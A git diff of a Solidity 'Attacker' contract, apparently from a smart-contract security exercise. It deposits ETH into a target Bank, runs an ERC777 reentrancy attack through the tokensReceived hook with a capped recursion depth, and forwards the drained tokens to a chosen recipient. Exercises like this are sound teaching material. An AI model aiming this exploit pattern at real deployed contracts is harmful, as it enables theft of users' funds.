@@ -5,18 +5,18 @@ import "@openzeppelin/contracts/access/AccessControl.sol";
 import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
 import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
 import "./Bank.sol";
+import "./MCITR.sol"; // Import the MCITR token contract
 
 contract Attacker is AccessControl, IERC777Recipient {
     bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
-    IERC1820Registry private constant _erc1820 = IERC1820Registry(
+    IERC1820Registry private _erc1820 = IERC1820Registry(
         0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
     ); // EIP1820 registry address
     bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
+    uint8 private depth = 0;
+    uint8 private constant MAX_DEPTH = 5; // Adjust recursion depth as needed
 
     Bank public bank;
-    uint256 public attackAmount;
-    uint8 private depth = 0;
-    uint8 private constant MAX_DEPTH = 10; // Adjusted recursion depth
 
     event Recurse(uint8 depth);
 
@@ -33,21 +33,19 @@ contract Attacker is AccessControl, IERC777Recipient {
     }
 
     /*
-       Sets the target Bank contract to attack
+        Sets the target Bank contract to attack
     */
     function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
         bank = Bank(bank_address);
     }
 
     /*
-       Starts the reentrancy attack
-       amt: The amount of ETH to deposit initially
+        The main attack function that starts the reentrancy attack
+        amt: The amount of ETH to deposit initially
     */
     function attack(uint256 amt) external payable onlyRole(ATTACKER_ROLE) {
         require(address(bank) != address(0), "Target bank not set");
         require(msg.value == amt, "Incorrect ETH amount sent");
-
-        attackAmount = amt;
 
         // Deposit ETH to have a positive balance in the Bank
         bank.deposit{value: amt}();
@@ -57,30 +55,23 @@ contract Attacker is AccessControl, IERC777Recipient {
     }
 
     /*
-       Withdraws stolen tokens to the recipient
+        After the attack, withdraw the stolen tokens to the recipient
     */
     function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
         require(recipient != address(0), "Invalid recipient");
 
-        // Redeem tokens for ETH
+        // Get the token contract from the bank
         ERC777 token = bank.token();
         uint256 tokenBalance = token.balanceOf(address(this));
 
-        require(tokenBalance > 0, "No tokens to redeem");
+        require(tokenBalance > 0, "No tokens to withdraw");
 
-        // Approve the Bank contract to spend tokens
-        token.approve(address(bank), tokenBalance);
-
-        // Redeem tokens for ETH
-        bank.redeem(tokenBalance);
-
-        // Transfer ETH to recipient
-        (bool success, ) = recipient.call{value: address(this).balance}("");
-        require(success, "ETH transfer failed");
+        // Send the stolen tokens to the recipient
+        token.send(recipient, tokenBalance, "");
     }
 
     /*
-       Called when tokens are received from the Bank contract
+        This function is called when the Bank contract sends MCITR tokens
     */
     function tokensReceived(
         address, /* operator */
@@ -105,6 +96,6 @@ contract Attacker is AccessControl, IERC777Recipient {
         depth--;
     }
 
-    // Allow contract to receive ETH
+    // Allow the contract to receive ETH
     receive() external payable {}
 }
